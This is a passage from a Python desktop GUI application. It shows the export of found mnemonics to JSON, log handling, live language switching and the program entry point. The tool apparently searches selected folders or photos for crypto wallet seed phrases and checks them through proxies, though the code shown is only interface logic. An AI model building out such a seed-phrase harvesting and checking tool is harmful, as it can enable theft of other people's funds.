            with open(path, 'w', encoding='utf-8') as f:
                json.dump(self.found_mnemonics, f, indent=2, ensure_ascii=False)
        
        messagebox.showinfo("Done", f"Exported {len(self.found_mnemonics)} mnemonics to {Path(path).name}")

    def _add_find_log(self, msg, level="info"):
        def _do():
            ts = datetime.now().strftime("%H:%M:%S")
            self.find_log.insert("end", f"[{ts}] {msg}\n")
            self.find_log.see("end")
        if threading.current_thread() is threading.main_thread(): _do()
        else: self.after(0, _do)

    # ── LANGUAGE ──────────────────────────────────────────────────
    def _change_lang(self, sel):
        rev = {v:k for k,v in LANG_LABELS.items()}
        new = rev.get(sel, 'en')
        if new != self.lang_code:
            self.lang_code = new
            self.db.set('language', new)
            self._rebuild_ui()

    def _rebuild_ui(self):
        """Live language switch — rebuild all widgets, preserve state."""
        was_checking = self.checking
        saved_folders = self.selected_folders
        saved_photo = self.selected_photo
        saved_proxy = self.proxy_file
        saved_mnemonics = self.found_mnemonics
        
        for w in self.winfo_children():
            w.destroy()
        self._build()
        
        # Restore state
        self.selected_folders = saved_folders
        self.selected_photo = saved_photo
        self.proxy_file = saved_proxy
        self.found_mnemonics = saved_mnemonics
        if saved_folders:
            self.folder_lbl.configure(text=Path(saved_folders[0]).name)
        if saved_proxy:
            self.proxy_lbl.configure(text=Path(saved_proxy).name)
        if saved_photo:
            self.photo_lbl.configure(text=Path(saved_photo).name, text_color="green")
        if was_checking:
            self.checking = True
            self.start_btn.configure(text="⏹️ "+self.t('stop'), fg_color="#e74c3c")
        
        self._show_tab('checker')
        self._update_stats()

def main():
    try:
        app = App()
        app.mainloop()
    except Exception as e:
        logger.error(f"Critical: {e}")
        traceback.print_exc()
        input("Press Enter...")

if __name__ == "__main__":
    main()